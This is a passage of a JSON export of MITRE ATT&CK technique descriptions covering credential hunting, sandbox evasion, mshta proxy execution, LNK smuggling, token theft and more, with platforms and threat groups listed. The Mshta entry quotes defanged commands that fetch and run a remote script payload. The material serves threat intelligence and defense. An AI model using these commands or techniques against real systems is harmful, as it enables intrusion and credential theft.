detection.^[[1]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^","platforms":["Network"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1552.003":{"id":"T1552.003","name":"Bash History","description":"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s `.bash_history` file. For each user, this file resides at the same location: `~/.bash_history`. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. ^[[1]](http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way)^","platforms":["Linux","macOS"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1562.010":{"id":"T1562.010","name":"Downgrade Attack","description":"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).^[[1]](https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/)^ For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.^[[2]](https://www.crowdstrike.com/blog/how-falcon-complete-stopped-a-big-game-hunting-ransomware-attack/)^^[[3]](https://www.mandiant.com/resources/bring-your-own-land-novel-red-teaming-technique)^^[[4]](https://nsfocusglobal.com/attack-and-defense-around-powershell-event-logging/)^\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.^[[5]](https://blog.checkpoint.com/research/targeted-ssl-stripping-attacks-are-real/amp/)^^[[6]](https://www.crowdstrike.com/cybersecurity-101/attack-types/downgrade-attacks/)^","platforms":["Windows","Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1559.003":{"id":"T1559.003","name":"XPC Services","description":"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service `C API` or the high level `NSXPCConnection API` in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.^[[1]](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW1)^^[[2]](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/DesigningDaemons.html)^\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.^[[3]](https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html)^^[[4]](https://wojciechregula.blog/post/learn-xpc-exploitation-part-3-code-injections/)^ This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).","platforms":["macOS"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1497":{"id":"T1497","name":"Virtualization/Sandbox Evasion","description":"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.^[[1]](https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc)^\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.^[[2]](https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/)^\n\n","platforms":["Windows","macOS","Linux"],"tactics":["Defense Evasion","Discovery"],"campaigns":["Operation Spalax"],"groups":["Darkhotel","The White Company"]},"T1102":{"id":"T1102","name":"Web Service","description":"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["C0027","Operation Spalax","C0017"],"groups":["Inception","Rocke","FIN6","LazyScripter","FIN8","EXOTIC LILY","Ember Bear","Fox Kitten","Turla","Mustang Panda","Gamaredon Group","APT32","TeamTNT","Chimera"]},"T1552.001":{"id":"T1552.001","name":"Credentials In Files","description":"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). ^[[1]](http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html)^ Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. ^[[2]](http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx)^\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.^[[3]](https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/)^ They may also be found as parameters to deployment commands in container logs.^[[4]](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/)^ In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.^[[5]](https://posts.specterops.io/head-in-the-clouds-bd038bb69e48)^","platforms":["Windows","IaaS","Linux","macOS","Containers"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT33","Fox Kitten","TA505","FIN13","APT3","Leafminer","Kimsuky","OilRig","TeamTNT","MuddyWater","Stolen Pencil"]},"T1568.003":{"id":"T1568.003","name":"DNS Calculation","description":"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.^[[1]](http://www.crowdstrike.com/blog/whois-numbered-panda/)^\n\nOne implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.^[[1]](http://www.crowdstrike.com/blog/whois-numbered-panda/)^^[[2]](https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html)^^[[3]](https://blog.rapid7.com/2013/08/26/upcoming-g20-summit-fuels-espionage-operations/)^","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT12"]},"T1218.005":{"id":"T1218.005","name":"Mshta","description":"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code ^[[1]](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)^ ^[[2]](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/)^ ^[[3]](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)^ ^[[4]](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/)^ ^[[5]](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)^ \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. ^[[6]](https://en.wikipedia.org/wiki/HTML_Application)^ HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. ^[[7]](https://msdn.microsoft.com/library/ms536471.aspx)^\n\nFiles may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))`\n\nThey may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. ^[[8]](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Dust Storm","C0015"],"groups":["Sidewinder","Lazarus Group","MuddyWater","Mustang Panda","LazyScripter","TA2541","Inception","Kimsuky","FIN7","Earth Lusca","APT32","APT29","Confucius","TA551","SideCopy","Gamaredon Group"]},"T1547.015":{"id":"T1547.015","name":"Login Items","description":"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.^[[1]](https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac)^ Login items can be added via a shared file list or Service Management Framework.^[[2]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html)^ Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call `SMLoginItemSetEnabled`.\n\nLogin items installed using the Service Management Framework leverage `launchd`, are not visible in the System Preferences, and can only be removed by the application that created them.^[[2]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html)^^[[3]](https://blog.timschroeder.net/2013/04/21/smloginitemsetenabled-demystified/)^ Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.^[[4]](https://developer.apple.com/documentation/coreservices/launch_services)^ Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.^[[5]](https://eclecticlight.co/2018/05/22/running-at-startup-when-to-use-a-login-item-or-a-launchagent-launchdaemon/)^ Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.^[[6]](https://developer.apple.com/library/archive/samplecode/LoginItemsAE/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003788)^ Adversaries can use a command such as `tell application “System Events” to make login item at end with properties /path/to/executable`.^[[7]](https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/)^^[[8]](http://www.hexed.in/2019/07/osxdok-analysis.html)^^[[9]](https://gist.github.com/kaloprominat/6111584)^ This command adds the path of the malicious executable to the login item file list located in `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`.^[[7]](https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/)^ Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.^[[10]](https://objective-see.com/blog/blog_0x25.html)^^[[11]](https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/)^^[[12]](https://objective-see.com/blog/blog_0x44.html)^","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1608":{"id":"T1608","name":"Stage Capabilities","description":"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.^[[1]](https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/)^^[[2]](https://www.dragos.com/blog/industry-news/a-new-water-watering-hole/)^^[[3]](https://www.malwarebytes.com/blog/news/2019/12/theres-an-app-for-that-web-skimmers-found-on-paas-heroku)^^[[4]](https://www.netskope.com/blog/targeted-attacks-abusing-google-cloud-platform-open-redirection)^^[[5]](https://www.netskope.com/blog/a-big-catch-cloud-phishing-from-google-app-engine-and-azure-app-service)^\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.^[[6]](https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html)^^[[7]](http://arstechnica.com/security/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/)^^[[8]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^\n* Staging web resources for a link target to be used with spearphishing.^[[9]](https://blog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attack/)^^[[10]](https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian)^\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).^[[1]](https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/)^\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).^[[11]](https://www.digicert.com/kb/ssl-certificate-installation.htm)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Mustang Panda"]},"T1608.005":{"id":"T1608.005","name":"Link Target","description":"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).^[[1]](https://blog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attack/)^^[[2]](https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian)^ Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.^[[3]](https://www.netskope.com/blog/targeted-attacks-abusing-google-cloud-platform-open-redirection)^^[[4]](https://www.netskope.com/blog/a-big-catch-cloud-phishing-from-google-app-engine-and-azure-app-service)^^[[5]](https://www.intezer.com/blog/malware-analysis/kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure/)^ Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.^[[6]](https://blog.talosintelligence.com/ipfs-abuse/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["LuminousMoth","Silent Librarian"]},"T1104":{"id":"T1104","name":"Multi-Stage Channels","description":"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT3","Lazarus Group","MuddyWater","APT41"]},"T1657":{"id":"T1657","name":"Financial Theft","description":"Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,^[[1]](https://www.cisa.gov/sites/default/files/Ransomware_Trifold_e-version.pdf)^ business email compromise (BEC) and fraud,^[[2]](https://www.fbi.gov/file-repository/fy-2022-fbi-congressional-report-business-email-compromise-and-real-estate-wire-fraud-111422.pdf/view)^ \"pig butchering,\"^[[3]](https://www.wired.com/story/pig-butchering-fbi-ic3-2022-report/)^ bank hacking,^[[4]](https://www.justice.gov/usao-cdca/pr/3-north-korean-military-hackers-indicted-wide-ranging-scheme-commit-cyber-attacks-and)^ and exploiting cryptocurrency networks.^[[5]](https://www.bbc.com/news/technology-60933174)^ \n\nAdversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.^[[6]](https://www.ic3.gov/Media/PDF/AnnualReport/2022_IC3Report.pdf)^ In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.^[[2]](https://www.fbi.gov/file-repository/fy-2022-fbi-congressional-report-business-email-compromise-and-real-estate-wire-fraud-111422.pdf/view)^ This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.^[[7]](https://www.cloudflare.com/learning/email-security/what-is-vendor-email-compromise/#:~:text=Vendor%20email%20compromise%2C%20also%20referred,steal%20from%20that%20vendor%27s%20customers.)^\n\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) ^[[8]](https://www.nytimes.com/2021/05/13/technology/colonial-pipeline-ransom.html)^ and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening public exposure unless payment is made to the adversary.^[[9]](https://www.mandiant.com/resources/blog/ransomware-extortion-ot-docs)^\n\nDue to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.^[[10]](https://apnews.com/article/russia-ukraine-technology-business-europe-hacking-ce7a8aca506742ab8e8873e7f9f229c2)^","platforms":["Linux","macOS","Windows","Office 365","SaaS","Google Workspace"],"tactics":["Impact"],"campaigns":[],"groups":["FIN13","SilverTerrier"]},"T1480":{"id":"T1480","name":"Execution Guardrails","description":"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.^[[1]](https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/)^ Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.^[[2]](https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html)^\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT33"]},"T1619":{"id":"T1619","name":"Cloud Storage Object Discovery","description":"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS ^[[1]](https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjectsV2.html)^ and List Blobs in Azure^[[2]](https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs)^ .","platforms":["IaaS"],"tactics":["Discovery"],"campaigns":[],"groups":[]},"T1606.001":{"id":"T1606.001","name":"Web Cookies","description":"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.^[[1]](https://wunderwuzzi23.github.io/blog/passthecookie.html)^ The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.^[[2]](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)^^[[1]](https://wunderwuzzi23.github.io/blog/passthecookie.html)^^[[3]](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)^","platforms":["Linux","macOS","Windows","SaaS","IaaS"],"tactics":["Credential Access"],"campaigns":["SolarWinds Compromise"],"groups":["APT29","UNC2452"]},"T1654":{"id":"T1654","name":"Log Enumeration","description":"Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).\n\nHost binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.^[[1]](https://labs.withsecure.com/content/dam/labs/docs/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf)^^[[2]](https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/)^ In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.^[[3]](https://www.mandiant.com/resources/blog/sim-swapping-abuse-azure-serial)^\n\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.","platforms":["Linux","macOS","Windows","IaaS"],"tactics":["Discovery"],"campaigns":[],"groups":["Volt Typhoon"]},"T1134.001":{"id":"T1134.001","name":"Token Impersonation/Theft","description":"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["APT28","FIN8"]},"T1567.001":{"id":"T1567.001","name":"Exfiltration to Code Repository","description":"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1021.007":{"id":"T1021.007","name":"Cloud Services","description":"Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as `Connect-AZAccount` for Azure PowerShell, `Connect-MgGraph` for Microsoft Graph PowerShell, and `gcloud auth login` for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ","platforms":["Office 365","Azure AD","SaaS","IaaS","Google Workspace"],"tactics":["Lateral Movement"],"campaigns":["C0027"],"groups":["APT29"]},"T1205.001":{"id":"T1205.001","name":"Port Knocking","description":"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r ^[[1]](https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631)^, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","platforms":["Linux","macOS","Windows","Network"],"tactics":["Defense Evasion","Persistence","Command and Control"],"campaigns":[],"groups":["PROMETHIUM"]},"T1027.012":{"id":"T1027.012","name":"LNK Icon Smuggling","description":"Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.^[[1]](https://unprotect.it/technique/shortcut-hiding/)^^[[2]](https://www.uperesia.com/booby-trapped-shortcut)^\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. \n","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1583.006":{"id":"T1583.006","name":"Web Services","description":"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Sharpshooter","Operation Dream Job"],"groups":["Earth Lusca","HAFNIUM","Turla","ZIRCONIUM","APT17","MuddyWater","APT28","APT29","FIN7","Lazarus 